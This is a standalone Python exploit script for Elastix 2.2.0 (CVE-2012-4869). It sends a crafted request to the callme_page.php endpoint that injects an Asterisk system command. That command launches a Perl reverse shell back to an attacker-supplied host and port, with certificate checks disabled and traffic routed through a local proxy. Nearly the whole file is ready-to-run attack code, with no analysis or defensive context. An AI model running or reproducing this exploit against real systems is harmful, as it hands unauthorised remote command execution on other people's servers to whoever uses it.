import socket
import argparse
import requests
import os
import sys
import ssl
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class TLSAdapter(HTTPAdapter):
    def init_poolmanager(self, *args, **kwargs):
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False 
        context.verify_mode = ssl.CERT_NONE
        kwargs['ssl_context'] = context
        return super(TLSAdapter, self).init_poolmanager(*args, **kwargs)


parser = argparse.ArgumentParser(description="Elastix 2.2.0 Local File Inclusion CVE-2012-4869")
parser.add_argument('URL', type=str, help="Vulnerable Website")
parser.add_argument('--LHOST', type=str, required=True, help="Your IP address for reverse shell")
parser.add_argument('--LPORT', type=int, required=True, help="Your Port for reverse shell")
input_arg = parser.parse_args()

print("\n[*] Running Elastix 2.2.0 LFI Exploit - CVE-2012-4869")
print(f"[*] Target: {input_arg.URL}")
print(f"[*] Listening on {input_arg.LHOST}:{input_arg.LPORT}\n")


url = f'{input_arg.URL}/recordings/misc/callme_page.php?action=c&callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{input_arg.LHOST}%3a{input_arg.LPORT}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'
session = requests.Session()
session.mount('https://', TLSAdapter())

try:
    response = session.get(url, verify=False, timeout=10, proxies={'https':'http://localhost:8080'})
    if response.status_code == 200:
        print("[+] Exploit sent successfully, waiting for reverse shell...\n")
    else:
        print(f"[!] Exploit failed, server responded with status code {response.status_code}\n")
except requests.exceptions.RequestException as e:
    print(f"[!] Error sending exploit: {e}")
    sys.exit(1)